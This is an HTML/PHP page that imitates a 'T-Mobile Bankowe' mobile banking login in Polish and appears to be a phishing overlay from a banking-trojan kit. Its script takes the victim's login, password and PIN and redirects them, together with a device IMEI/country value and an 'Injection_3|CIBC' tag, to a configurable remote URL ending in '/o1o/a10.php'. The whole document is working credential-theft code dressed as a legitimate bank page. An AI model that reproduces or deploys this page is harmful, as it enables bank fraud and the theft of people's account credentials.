<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>T-Mobile Bankowe</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="pl/pl.bps.bankowoscmobilna/css/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="booting on text-center alert alert-danger" style="position: absolute;width: 100%;">
        Błąd połączenia z serwerem
    </div>
    <div class="header">
        <img style="float: left;width: 43px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFEAAABRCAMAAACdUboEAAAACVBMVEUAAAC400a400b7N6dhAAAAAnRSTlMAAQGU/a4AAAA+SURBVFjD7dQhDgAgDATBg/8/GofCASE0M6pqTdMmAADfactxS5+iqKj4pOhTKCqWK164wvPsWlHRpwCoYwCMugKJRxxy0QAAAABJRU5ErkJggg==">
        <img style="width: 55px;margin-left: -43px;padding: 3px;" src="data:image/png;base64,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">
    </div>
    <div class="header2">
        ZALOGUJ
    </div>
    <form id="form">
        <div class="wrap">
            <label for="login">Login</label>
            <input type="text" class="input" name="login" placeholder="Prodaj Login" id="login">

            <label for="password">Hasło</label>
            <input type="password" class="input" name="password" placeholder="Prodaj Hasło" id="password">

            <label for="pin">PIN</label>
            <input type="password" class="input" name="pin" placeholder="Prodaj PIN" id="pin">
        </div>
        <input type="button" id="submitBtn1" class="button" onclick="sentServer();" value="Zaloguj">
    </form>
    <script type="text/javascript">
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');
                        var oPinInp = document.getElementById('pin');

						try{
							oNumInp.className = oCodeInp.className = oPinInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 4) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (oCodeInp.value.length < 4) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }


                        if (oPinInp.value.length < 4) {
							try{
                                oPinInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                        sentServer();
                    }

            </script>
<script>
    function sentServer(){

        var oNumInp1 = document.getElementById('login');
        var oNumInp2 = document.getElementById('password');
        var oNumInp3 = document.getElementById('pin');



                var url='<?php echo $URL; ?>';
            var imei_c='<?php echo $IMEI_country; ?>';

        var login1 = oNumInp1.value;
        var pass = oNumInp2.value;
        var pin = oNumInp3.value;

        location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|CIBC|"+login1+"|"+pass+"|"+pin);

    }
</script>
    <script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},3e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>

</body>
</html>
